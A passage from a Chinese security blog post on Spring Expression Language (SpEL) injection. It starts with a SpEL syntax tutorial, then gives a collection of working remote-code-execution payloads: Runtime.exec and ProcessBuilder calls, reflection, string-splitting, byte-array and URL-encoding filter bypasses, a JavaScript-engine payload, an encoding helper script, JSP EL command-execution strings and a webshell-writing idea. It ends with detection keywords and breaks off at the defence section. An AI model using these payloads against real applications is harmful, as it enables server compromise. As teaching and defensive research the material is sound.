java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChoseCity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> City city;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCity</span><span class="params">(City city)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.city = city;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> City <span class="title">getCity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> city;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Beans.xml中，选取集合中的某一个成员，并赋值给city属性中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"choseCity"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.ChoseCity"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"city"</span> <span class="attr">value</span>=<span class="string">"#&#123;cities[0]&#125;"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>MainApp.java，实例化这个Bean：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"Beans.xml"</span>);</span><br><span class="line">        ChoseCity c = (ChoseCity)context.getBean(<span class="string">"choseCity"</span>);</span><br><span class="line">        System.out.println(c.getCity().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行无误则输出”Chicago”。</p><p>随机地选择一个city，中括号<code>[]</code>运算符始终通过索引访问集合中的成员：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"city"</span> <span class="attr">value</span>=<span class="string">"#&#123;cities[T(java.lang.Math).random()*cities.size()]&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>此时会随机访问一个集合成员并输出。</p><blockquote><p><code>[]</code>运算符同样可以用来获取java.util.Map集合中的成员。例如，假设City对象以其名字作为键放入Map集合中，在这种情况下，我们可以像下面那样获取键为Dallas的entry：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"chosenCity"</span> <span class="attr">value</span>=<span class="string">"#&#123;cities['Dallas']&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><code>[]</code>运算符的另一种用法是从java.util.Properties集合中取值。例如，假设我们需要通过<code>&lt;util:properties&gt;</code>元素在Spring中加载一个properties配置文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">util:properties</span> <span class="attr">id</span>=<span class="string">"settings"</span> <span class="attr">loaction</span>=<span class="string">"classpath:settings.properties"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>现在要在这个配置文件Bean中访问一个名为twitter.accessToken的属性：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"accessToken"</span> <span class="attr">value</span>=<span class="string">"#&#123;settings['twitter.accessToken']&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><code>[]</code>运算符同样可以通过索引来得到某个字符串的某个字符，例如下面的表达式将返回s：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; &apos;This is a test&apos;[3]</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="查询集合成员"><a href="#查询集合成员" class="headerlink" title="查询集合成员"></a>查询集合成员</h4><p>SpEL表达式中提供了查询运算符来实现查询符合条件的集合成员：</p><ul><li><code>.?[]</code>：返回所有符合条件的集合成员；</li><li><code>.^[]</code>：从集合查询中查出第一个符合条件的集合成员；</li><li><code>.$[]</code>：从集合查询中查出最后一个符合条件的集合成员；</li></ul><p>修改ChoseCity类，将city属性类型改为City列表类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChoseCity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;City&gt; city;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;City&gt; <span class="title">getCity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> city;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCity</span><span class="params">(List&lt;City&gt; city)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.city = city;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改Beans.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"choseCity"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.ChoseCity"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"city"</span> <span class="attr">value</span>=<span class="string">"#&#123;cities.?[population gt 100000]&#125;"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改MainApp.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"Beans.xml"</span>);</span><br><span class="line">        ChoseCity c = (ChoseCity)context.getBean(<span class="string">"choseCity"</span>);</span><br><span class="line">        <span class="keyword">for</span>(City city:c.getCity())&#123;</span><br><span class="line">            System.out.println(city.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Chicago</span><br><span class="line">Atlanta</span><br><span class="line">Dallas</span><br><span class="line">Houston</span><br><span class="line">El Paso</span><br></pre></td></tr></table></figure><h4 id="集合投影"><a href="#集合投影" class="headerlink" title="集合投影"></a>集合投影</h4><blockquote><p>集合投影就是从集合的每一个成员中选择特定的属性放入到一个新的集合中。SpEL的投影运算符<code>.![]</code>完全可以做到这一点。</p><p>例如，我们仅需要包含城市名称的一个String类型的集合：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"cityNames"</span> <span class="attr">value</span>=<span class="string">"#&#123;cities.![name]&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>再比如，得到城市名字加州名的集合：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt;property name=&quot;cityNames&quot; value=&quot;#&#123;cities.![name+&apos;,&apos;+state]&#125;&quot;/&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>把符合条件的城市的名字和州名作为一个新的集合：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"cityNames"</span> <span class="attr">value</span>=<span class="string">"#&#123;cities.?[population gt 100000].![name+','+state]&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h3 id="变量定义和引用"><a href="#变量定义和引用" class="headerlink" title="变量定义和引用"></a>变量定义和引用</h3><p>在SpEL表达式中，变量定义通过EvaluationContext类的setVariable(variableName, value)函数来实现；在表达式中使用”#variableName”来引用；除了引用自定义变量，SpEL还允许引用根对象及当前上下文对象：</p><ul><li><code>#this</code>：使用当前正在计算的上下文；</li><li><code>#root</code>：引用容器的root对象；</li></ul><p>示例，使用setVariable()函数定义了名为variable的变量，并且通过<code>#variable</code>来引用，同时尝试引用根对象和上下文对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">EvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext(<span class="string">"mi1k7ea"</span>);</span><br><span class="line">context.setVariable(<span class="string">"variable"</span>, <span class="string">"666"</span>);</span><br><span class="line">String result1 = parser.parseExpression(<span class="string">"#variable"</span>).getValue(context, String.class);</span><br><span class="line">System.out.println(result1);</span><br><span class="line">String result2 = parser.parseExpression(<span class="string">"#root"</span>).getValue(context, String.class);</span><br><span class="line">System.out.println(result2);</span><br><span class="line">String result3 = parser.parseExpression(<span class="string">"#this"</span>).getValue(context, String.class);</span><br><span class="line">System.out.println(result3);</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">666</span><br><span class="line">mi1k7ea</span><br><span class="line">mi1k7ea</span><br></pre></td></tr></table></figure><h3 id="instanceof-表达式"><a href="#instanceof-表达式" class="headerlink" title="instanceof 表达式"></a>instanceof 表达式</h3><p>SpEL 支持 instanceof 运算符，跟 Java 内使用同义；如”‘haha’ instanceof T(String)”将返回 true。</p><h3 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h3><p>目前只支持类静态方法注册为自定义函数。SpEL使用StandardEvaluationContext的registerFunction方法进行注册自定义函数，其实完全可以使用setVariable代替，两者其实本质是一样的。</p><p>示例，用户自定义实现字符串反转的函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserFunc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">reverseString</span><span class="params">(String input)</span> </span>&#123;</span><br><span class="line">        StringBuilder backwards = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; input.length(); i++) &#123;</span><br><span class="line">            backwards.append(input.charAt(input.length() - <span class="number">1</span> - i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> backwards.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过如下代码将方法注册到StandardEvaluationContext并且来使用它：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">context.registerFunction(<span class="string">"reverseString"</span>, UserFunc.class.getDeclaredMethod(<span class="string">"reverseString"</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;));</span><br><span class="line">String helloWorldReversed = parser.parseExpression(<span class="string">"#reverseString('mi1k7ea')"</span>).getValue(context, String.class);</span><br><span class="line">System.out.println(helloWorldReversed);</span><br></pre></td></tr></table></figure><p>输出反转的字符串<code>ae7k1im</code>。</p><h2 id="0x02-SpEL表达式注入漏洞"><a href="#0x02-SpEL表达式注入漏洞" class="headerlink" title="0x02 SpEL表达式注入漏洞"></a>0x02 SpEL表达式注入漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个EvaluationContext：</p><ul><li>SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</li><li>StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</li></ul><p>SimpleEvaluationContext旨在仅支持SpEL语言语法的一个子集，不包括 Java类型引用、构造函数和bean引用；而StandardEvaluationContext是支持全部SpEL语法的。</p><p>由前面知道，SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)来调用任意类方法。这是因为在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。</p><p>如下，前面的例子中已提过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String spel = <span class="string">"T(java.lang.Runtime).getRuntime().exec(\"calc\")"</span>;</span><br><span class="line">        ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">        Expression expression = parser.parseExpression(spel);</span><br><span class="line">        System.out.println(expression.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行弹计算器：</p><p><img src="/2020/01/10/SpEL表达式注入漏洞总结/1.png" alt=""></p><h3 id="PoC-amp-Bypass整理"><a href="#PoC-amp-Bypass整理" class="headerlink" title="PoC&amp;Bypass整理"></a>PoC&amp;Bypass整理</h3><p>下面我们来整理下各种利用的PoC，这里默认把定界符<code>#{}</code>去掉。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">// PoC原型</span><br><span class="line"></span><br><span class="line">// Runtime</span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">T(Runtime).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line"></span><br><span class="line">// ProcessBuilder</span><br><span class="line">new java.lang.ProcessBuilder(&#123;&apos;calc&apos;&#125;).start()</span><br><span class="line">new ProcessBuilder(&#123;&apos;calc&apos;&#125;).start()</span><br><span class="line"></span><br><span class="line">******************************************************************************</span><br><span class="line">// Bypass技巧</span><br><span class="line"></span><br><span class="line">// 反射调用</span><br><span class="line">T(String).getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line"></span><br><span class="line">// 同上，需要有上下文环境</span><br><span class="line">#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line"></span><br><span class="line">// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤</span><br><span class="line">T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;&#125;)</span><br><span class="line"></span><br><span class="line">// 同上，需要有上下文环境</span><br><span class="line">#this.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;&#125;)</span><br><span class="line"></span><br><span class="line">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1</span><br><span class="line">// byte数组内容的生成后面有脚本</span><br><span class="line">new java.lang.ProcessBuilder(new java.lang.String(new byte[]&#123;99,97,108,99&#125;)).start()</span><br><span class="line"></span><br><span class="line">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2</span><br><span class="line">// byte数组内容的生成后面有脚本</span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))</span><br><span class="line"></span><br><span class="line">// JavaScript引擎通用PoC</span><br><span class="line">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;nashorn&quot;).eval(&quot;s=[3];s[0]=&apos;cmd&apos;;s[1]=&apos;/C&apos;;s[2]=&apos;calc&apos;;java.la&quot;+&quot;ng.Run&quot;+&quot;time.getRu&quot;+&quot;ntime().ex&quot;+&quot;ec(s);&quot;)</span><br><span class="line"></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;xxx&quot;),)</span><br><span class="line"></span><br><span class="line">// JavaScript引擎+反射调用</span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;&#125;)),)</span><br><span class="line"></span><br><span class="line">// JavaScript引擎+URL编码</span><br><span class="line">// 其中URL编码内容为：</span><br><span class="line">// 不加最后的getInputStream()也行，因为弹计算器不需要回显</span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(T(java.net.URLDecoder).decode(&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;)),)</span><br><span class="line"></span><br><span class="line">// 黑名单过滤&quot;.getClass(&quot;，可利用数组的方式绕过，还未测试成功</span><br><span class="line">&apos;&apos;[&apos;class&apos;].forName(&apos;java.lang.Runtime&apos;).getDeclaredMethods()[15].invoke(&apos;&apos;[&apos;class&apos;].forName(&apos;java.lang.Runtime&apos;).getDeclaredMethods()[7].invoke(null),&apos;calc&apos;)</span><br><span class="line"></span><br><span class="line">// JDK9新增的shell，还未测试</span><br><span class="line">T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(&quot;jdk.jshell.JShell&quot;,true).Methods[6].invoke(null,&#123;&#125;).eval(&apos;whatever java code in one statement&apos;).toString()</span><br></pre></td></tr></table></figure><p>CreateAscii.py，用于String类动态生成字符的字符ASCII码转换生成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">message = input(<span class="string">'Enter message to encode:'</span>)</span><br><span class="line"> </span><br><span class="line">print(<span class="string">'Decoded string (in ASCII):\n'</span>)</span><br><span class="line"> </span><br><span class="line">print(<span class="string">'T(java.lang.Character).toString(%s)'</span> % ord(message[<span class="number">0</span>]), end=<span class="string">""</span>)</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> message[<span class="number">1</span>:]:</span><br><span class="line">   print(<span class="string">'.concat(T(java.lang.Character).toString(%s))'</span> % ord(ch), end=<span class="string">""</span>), </span><br><span class="line">print(<span class="string">'\n'</span>)</span><br><span class="line"> </span><br><span class="line">print(<span class="string">'new java.lang.String(new byte[]&#123;'</span>, end=<span class="string">""</span>),</span><br><span class="line">print(ord(message[<span class="number">0</span>]), end=<span class="string">""</span>)</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> message[<span class="number">1</span>:]:</span><br><span class="line">   print(<span class="string">',%s'</span> % ord(ch), end=<span class="string">""</span>), </span><br><span class="line">print(<span class="string">')&#125;'</span>)</span><br></pre></td></tr></table></figure><p>其他的一些payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 转自：https://www.jianshu.com/p/ce4ac733a4b9</span><br><span class="line"></span><br><span class="line">$&#123;pageContext&#125; 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。）</span><br><span class="line"></span><br><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)&#125;   获取web路径</span><br><span class="line"></span><br><span class="line">$&#123;header&#125;  文件头参数</span><br><span class="line"></span><br><span class="line">$&#123;applicationScope&#125; 获取webRoot</span><br><span class="line"></span><br><span class="line">$&#123;pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;命令&quot;).getInputStream())&#125;  执行命令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 渗透思路：获取webroot路径，exec执行命令echo写入一句话。</span><br><span class="line"></span><br><span class="line">&lt;p th:text=&quot;$&#123;#this.getClass().forName(&apos;java.lang.System&apos;).getProperty(&apos;user.dir&apos;)&#125;&quot;&gt;&lt;/p&gt;   //获取web路径</span><br></pre></td></tr></table></figure><h2 id="0x03-检测与防御"><a href="#0x03-检测与防御" class="headerlink" title="0x03 检测与防御"></a>0x03 检测与防御</h2><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>全局搜索关键特征：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//关键类</span></span><br><span class="line">org.springframework.expression.Expression</span><br><span class="line">org.springframework.expression.ExpressionParser</span><br><span class="line">org.springframework.expression.spel.standard.SpelExpressionParser</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用特征</span></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression expression = parser.parseExpression(str);</span><br><span class="line">expression.getValue()</span><br><span class="line">expression.setValue()</span><br></pre></td></tr></table></figure><h3 id="防御方法"><a href="#防御方法" class="headerlink" 